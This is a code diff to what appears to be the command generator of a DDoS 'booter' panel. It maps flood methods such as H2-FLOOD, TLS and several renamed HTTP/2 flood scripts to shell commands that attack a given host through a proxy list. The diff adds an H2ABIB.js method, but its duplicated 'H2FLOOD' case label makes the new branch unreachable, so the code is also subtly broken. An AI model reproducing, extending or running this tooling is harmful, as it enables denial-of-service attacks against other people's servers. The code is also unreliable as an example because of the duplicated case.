@@ -12,6 +12,7 @@ const methods = {
     H2GECKO: 'HTTP-GECKO.js',
     TLS: 'tls.js',
     TLSNET: 'Tlsnet.js',
+    H2MIA: 'H2ABIB.js',
     CATMIA: 'Vzy.js',
     MIAMIX: 'MIXMAX.js',
     MIXBIL: 'MIXBIL.js',
@@ -28,6 +29,8 @@ const generateCommand = (method, host, port, time) => {
             return `cd /root/methods && node H2-FLASH.js ${host} ${time} 8 4 proxy.txt`;
         case 'H2FLOOD':
             return `cd /root/methods && node H2-FLOOD.js ${host} ${time} 64 4 proxy.txt`;
+        case 'H2FLOOD':
+            return `cd /root/methods && node H2ABIB.js ${host} ${time} 64 4 proxy.txt`;
         case 'CATMIA':
             return `cd /root/methods && node Vzy.js ${host} ${time} 64 4 proxy.txt`;
         case 'MIAMIX':
